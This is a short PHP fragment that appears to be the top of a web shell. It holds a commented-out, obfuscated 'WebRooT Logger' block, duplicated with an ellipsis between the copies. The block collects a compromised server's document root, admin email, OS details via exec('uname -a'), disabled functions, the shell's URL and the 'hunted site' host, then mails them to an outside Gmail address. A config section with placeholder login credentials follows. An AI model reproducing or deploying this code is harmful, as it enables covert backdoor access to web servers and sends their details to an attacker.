<?php 
/*
$IIIIIIIIIIII    = 'izazelus3@gmail.com';
$IIIIIIIIIIIl   = 'WebRooT Logger';
$IIIIIIIIIII1 = 'Dosya Yolu : '.$_SERVER['DOCUMENT_ROOT']."\r\n";
$IIIIIIIIIII1.= 'Server Mail : '.$_SERVER['SERVER_ADMIN']."\r\n";
$IIIIIIIIIII1.= 'Server isletim sistemi : '.$_SERVER['SERVER_SOFTWARE']."\r\n";
$IIIIIIIIIII1.= 'ip : '.$_SERVER['SERVER_ADDR']."\r\n";
$IIIIIIIIIII1.= 'OS : '.$IIIIIIIIIIlI = @exec('uname -a')."\r\n";
$IIIIIIIIIII1.= 'Kapali Fonksiyon : '.ini_get('disable_functions')."\r\n";
...
$IIIIIIIIIIll    = 'izazelus3@gmail.com';
$IIIIIIIIIIl1   = 'WebRooT Logger';
$IIIIIIIIII1I = 'Dosya Yolu : '.$_SERVER['DOCUMENT_ROOT']."\r\n";
$IIIIIIIIII1I.= 'Server Mail : '.$_SERVER['SERVER_ADMIN']."\r\n";
$IIIIIIIIII1I.= 'Server isletim sistemi : '.$_SERVER['SERVER_SOFTWARE']."\r\n";
$IIIIIIIIII1I.= 'ip : '.$_SERVER['SERVER_ADDR']."\r\n";
$IIIIIIIIII1I.= 'OS : '.$IIIIIIIIIIlI = @exec('uname -a')."\r\n";
$IIIIIIIIII1I.= 'Kapali Fonksiyon : '.ini_get('disable_functions')."\r\n";
$IIIIIIIIII1I.= 'Shell Link : http://'.$_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF']."\r\n";
$IIIIIIIIII1I.= 'Avlanan Site : '.$_SERVER['HTTP_HOST']."\r\n";
mail($IIIIIIIIIIll,$IIIIIIIIIIl1,$IIIIIIIIII1I);
*/
//-------------[ Config ]-------------\\
$username = "data";
$password = "data";
